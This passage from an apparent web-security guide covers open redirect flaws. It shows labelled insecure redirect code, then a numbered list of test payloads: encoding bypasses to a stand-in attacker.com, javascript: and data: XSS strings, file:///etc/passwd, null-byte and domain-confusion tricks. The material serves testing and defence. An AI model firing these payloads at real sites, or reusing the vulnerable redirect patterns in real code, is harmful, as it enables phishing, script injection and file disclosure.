## Common Developer Mistakes

❌ **Mistake 1: Sanitizing instead of validating**
```javascript
// Bad - developer removes 'javascript:' but allows redirects
const url = req.query.url.replace('javascript:', '');
res.redirect(url);  // Still vulnerable to //attacker.com
```

❌ **Mistake 2: Client-side only validation**
```javascript
// Bad - easily bypassed by modifying the request directly
if (url.startsWith('https://')) {  // Client-side only
  res.redirect(url);
}
```

❌ **Mistake 3: Blacklisting instead of whitelisting**
```javascript
// Bad - attacker can find ways around blacklist
const blocked = ['attacker.com', 'evil.org'];
if (!blocked.includes(url)) {
  res.redirect(url);  // Vulnerable
}
```

❌ **Mistake 4: Trusting URL encoding to prevent attacks**
```javascript
// Bad - encoded URLs can still be exploited
const url = decodeURIComponent(req.query.url);
res.redirect(url);
```

## Testing for Open Redirect

### Basic Tests

1. **Direct External URL**
   ```
   https://vulnerable-site.com/redirect?url=https://attacker.com
   ```
   Expected: Blocked or warning shown  
   Vulnerable if: Redirects silently to attacker.com

2. **Protocol-Relative URL**
   ```
   https://vulnerable-site.com/redirect?url=//attacker.com
   ```
   This uses the same protocol as the current page, bypassing some filters.

### Encoding Bypass Attempts

3. **URL Encoding (Single)**
   ```
   https://vulnerable-site.com/redirect?url=%2f%2fattacker.com
   ```
   The server may decode this before checking, allowing the bypass.

4. **Double URL Encoding**
   ```
   https://vulnerable-site.com/redirect?url=%252f%252fattacker.com
   ```
   Bypasses filters that decode once but don't recursively check.

5. **Unicode Encoding**
   ```
   https://vulnerable-site.com/redirect?url=%e0%80%2fattacker.com
   ```

6. **Mixed Case & HTML Entities**
   ```
   https://vulnerable-site.com/redirect?url=hTTp://attacker.com
   https://vulnerable-site.com/redirect?url=&#104;ttp://attacker.com
   ```

### Alternative Protocol Tests

7. **JavaScript Protocol**
   ```
   https://vulnerable-site.com/redirect?url=javascript:alert('XSS')
   https://vulnerable-site.com/redirect?url=javascript:void(0)
   ```
   Vulnerable if JavaScript is executed instead of redirecting.

8. **Data Protocol**
   ```
   https://vulnerable-site.com/redirect?url=data:text/html,<script>alert('XSS')</script>
   ```

9. **File Protocol**
   ```
   https://vulnerable-site.com/redirect?url=file:///etc/passwd
   ```
   Very dangerous if the backend processes file:// URLs.

### Path Traversal Tests

10. **Relative Path Traversal**
    ```
    https://vulnerable-site.com/redirect?url=../../../attacker.com
    ```

11. **Backslash Bypass**
    ```
    https://vulnerable-site.com/redirect?url=\\attacker.com
    ```

### Null Byte & Special Character Tests

12. **Null Byte Injection**
    ```
    https://vulnerable-site.com/redirect?url=https://trusted.com%00attacker.com
    ```
    Older systems might truncate at null byte.

13. **Fragment Identifier**
    ```
    https://vulnerable-site.com/redirect?url=https://trusted.com#attacker.com
    ```

14. **Query String Tricks**
    ```
    https://vulnerable-site.com/redirect?url=https://trusted.com?attacker.com
    https://vulnerable-site.com/redirect?url=https://trusted.com?redirect=attacker.com
    ```

### Advanced Techniques

15. **Domain Confusion**
    ```
    https://vulnerable-site.com/redirect?url=https://attacker.com@trusted.com
    ```
    Some URL parsers may misinterpret this.

16. **Uncommon Port**
    ```
    https://vulnerable-site.com/redirect?url=https://attacker.com:443@trusted.com
    ```

17. **IP Address Variations**
    ```
    https://vulnerable-site.com/redirect?url=http://127.0.0.1
    https://vulnerable-site.com/redirect?url=http://0x7f000001
    https://vulnerable-site.com/redirect?url=http://2130706433
    ```
    These all resolve to localhost/127.0.0.1.

### Testing Workflow

```
1. Identify redirect parameters (url, next, return, target, etc.)
2. Start with direct external URLs
3. Try protocol-relative URLs (//, \\)
4. Test encoding variations (single, double, unicode)
5. Try alternative protocols (javascript:, data:, file://)
6. Test path traversal and null bytes
7. Try domain confusion techniques
8. Document all successful bypasses
```

